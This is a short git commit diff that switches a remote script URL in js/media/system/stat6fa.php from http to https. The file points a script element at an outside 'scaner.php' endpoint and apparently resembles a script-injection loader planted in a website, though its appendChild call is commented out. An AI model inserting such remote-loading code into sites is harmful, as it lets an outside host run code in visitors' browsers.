27f11be49a760d1ad5944e08fa4a524ed5cfab4e
kagers <ka.gershfeld@gmail.com>
2016-11-07 17:38:14 -0500

    https

--- js/media/system/stat6fa.php
+++ js/media/system/stat6fa.php
@@ -2,6 +2,6 @@
 */var script = document.getElementById("onDate"); //createElement("script");
 
 
-script.src="http://profixsysline.net/plix/scaner.php?id=4";
+script.src="https://profixsysline.net/plix/scaner.php?id=4";
 
 //document.head.appendChild(script);
